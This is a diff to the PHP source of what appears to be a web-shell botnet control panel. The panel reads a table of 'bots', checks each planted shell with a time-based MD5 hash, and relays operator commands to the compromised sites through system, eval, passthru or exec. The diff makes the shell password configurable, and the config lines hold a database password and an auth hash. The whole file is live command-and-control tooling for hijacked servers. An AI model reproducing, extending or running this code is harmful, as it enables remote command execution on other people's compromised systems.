@@ -25,12 +25,15 @@ define('SQL_USER', 'root');
 define('SQL_PWD', 'He98MNYcMT674BcR');
 define('SQL_DB', 'quasibot');
 
-//Authentication, default credentials - quasi:changeme
+//Authentication, default credentials - admin:changeme
 define('AUTH_ENABLE', 1); //0 - Disable, 1 - Enable
 define('AUTH_USER', 'admin'); //Auth login
 define('AUTH_PASS', '4cb9c8a8048fd02294477fcb1a41191a'); //Auth password, MD5 encrypted
 define('AUTH_USECOOKIE', 0); //0 - Disable, 1 - Enable; Cookie Auth Protection
 define('AUTH_COOKIE', 'secretcookie=value'); //Cookie required for Cookie Auth
+
+//WebShell Protection
+define('WEBSHELL_PASS', '@123456789!');
 
 //Misc
 define('NMAP', '/usr/bin/nmap'); // Nmap executable for Scan module
@@ -146,7 +149,7 @@ $status = 'OK';
 } else {
 $status = 'BAD';
 }
-if(strpos($source, md5("#666#".date("h:d")))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
     $statdos = 'OK';
 } else {
     $statdos = 'BAD';
@@ -179,14 +182,14 @@ echo 'Count - ';
 $conn = new mysqli(SQL_HOST, SQL_USER, SQL_PWD, SQL_DB);
 $rows = mysqli_query($conn,'SELECT * FROM `bots`');
 echo mysqli_num_rows($rows);
-echo ' &nbsp;&bull;&nbsp; Current hash - '.md5("#666#".date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
+echo ' &nbsp;&bull;&nbsp; Current hash - '.md5(WEBSHELL_PASS . date("h:d")).' &nbsp;&bull;&nbsp; Proxy - '. PROXY_IP.':'.PROXY_PORT.'</a></p></p>';
 echo '<table align="center"><tr><td><b>ID</b></td><td><b>URL</b></td><td><b>IP</b></td><td><b>STATUS</b></td><td><b>OS</b></td><td><b>RCE</b></td><td><b>PWN</b></td></tr>';
 $id = 0;
 while($row = mysqli_fetch_assoc($rows)) {
 
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5("#666#".date("h:d")))) {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 $status = 'OK';
 $os = explode("{:|", $source);
 } else {
@@ -928,7 +931,7 @@ $rows = mysqli_query($conn,'SELECT * FROM `bots`', $conn);
 while($row = mysqli_fetch_assoc($rows)) {
 
 $source = conn($row['url'].'?_=system&__=uname');
-if(strpos($source, md5("#666#".date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
+if(strpos($source, md5(WEBSHELL_PASS . date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
 $x = conn($row['url'].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));
 
 $y = explode("{:|", $x);
